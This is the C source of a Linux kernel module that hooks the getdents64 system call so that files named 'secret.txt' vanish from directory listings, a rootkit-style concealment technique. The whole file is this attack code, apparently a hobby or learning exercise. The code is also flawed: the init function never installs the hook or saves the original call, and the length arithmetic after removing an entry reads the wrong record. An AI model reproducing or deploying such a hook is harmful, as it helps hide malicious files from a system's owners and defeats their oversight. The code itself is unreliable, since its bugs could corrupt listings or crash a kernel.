#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/moduleparam.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LavaTime");
MODULE_DESCRIPTION("A syscall hooking module");

#define TARGET "secret.txt"

struct linux_dirent64 {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

static unsigned long sym_addr = 0;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static void**sys_call_table;

module_param(sym_addr, ulong, 0644);

static int __init syscall_hooking_init(void)
{
	if (sym_addr == 0)
	{
		printk(KERN_WARNING "Syscall_hooker: Didn't receive a sys_call_table location!\n");
		return -1;
	}
	sys_call_table = (void **)sym_addr;
	
	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
	
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
{
	int fd = (int)regs->di;
	struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
	int count = regs->dx;

	long ret = orig_getdents64(regs);
	if (ret <= 0)
	{
		return ret;
	}
	else
	{
		struct linux_dirent64* kdirent;
		struct linux_dirent64* current_dir;
		unsigned long offset = 0;

		kdirent = kmalloc(ret, GFP_KERNEL);
		if (kdirent == NULL)
		{
			return ret;
		}
		if (copy_from_user(kdirent, dirp, ret) != 0)
		{
			kfree(kdirent);
			return ret;
		}

		while (offset < ret)
		{
			current_dir = (struct linux_dirent64 *)((char*)kdirent + offset);

			if (!strcmp(current_dir->d_name, TARGET))
			{
				memmove(current_dir, (struct linux_dirent64 *)((void*)current_dir + current_dir->d_reclen), (ret - (current_dir->d_reclen + offset)));
				ret -= current_dir->d_reclen;
			}
			else
			{
				offset += current_dir->d_reclen;
			}
		}
		copy_to_user(dirp, kdirent, ret);
		kfree(kdirent);
		return ret;
	}
}

static void __exit syscall_hooking_exit(void)
{
	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
}

module_init(syscall_hooking_init);
module_exit(syscall_hooking_exit);

